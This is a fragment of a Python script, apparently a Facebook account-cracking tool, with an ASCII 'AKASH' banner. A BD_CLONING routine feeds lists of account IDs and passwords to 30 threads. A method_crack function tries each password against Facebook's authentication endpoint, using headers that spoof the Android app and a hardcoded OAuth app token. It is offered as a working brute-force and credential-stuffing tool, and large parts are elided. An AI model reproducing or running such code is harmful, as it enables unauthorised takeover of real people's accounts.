...
logo=(f'''{B}
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
{warna}  | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
{B}  | |      __      | || |  ___  ____   | || |      __      | || |    _______   | || |  ____  ____  | |
{warna}  | |     /  \     | || | |_  ||_  _|  | || |     /  \     | || |   /  ___  |  | || | |_   ||   _| | |
{B}  | |    / /\ \    | || |   | |_/ /    | || |    / /\ \    | || |  |  (__ \_|  | || |   | |__| |   | |
{warna}  | |   / ____ \   | || |   |  __'.    | || |   / ____ \   | || |   '.___`-.   | || |   |  __  |   | |
{B}  | | _/ /    \ \_ | || |  _| |  \ \_  | || | _/ /    \ \_ | || |  |`\____) |  | || |  _| |  | |_  | |
{warna}  | ||____|  |____|| || | |____||____| | || ||____|  |____|| || |  |_______.'  | || | |____||____| | |
{B}  | |              | || |              | || |              | || |              | || |              | |
{warna}  | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
{B}  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
{warna}--------------------------------------------{B}
...
def BD_CLONING():
    user=[]
    clear()
    os.system('xdg-opern https://github.com/loveboy13')
    ...
    with tred(max_workers=30) as Akash:
        ...
        for psx in user:
            ...
            Akash.submit(method_crack,ids,passlist)
    linex()
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            header={'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 10; D101 Build/RKQ1.994437570) [FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
